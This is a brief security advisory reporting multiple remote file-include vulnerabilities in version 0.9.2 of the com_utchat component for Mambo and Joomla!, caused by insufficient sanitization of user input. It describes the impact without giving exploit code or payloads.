The com_utchat component for Mambo and Joomla! is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.

Exploiting these issues can allow an attacker to compromise the application and the underlying computer; other attacks are also possible.

These issues affect com_utchat 0.9.2; other versions may also be affected.
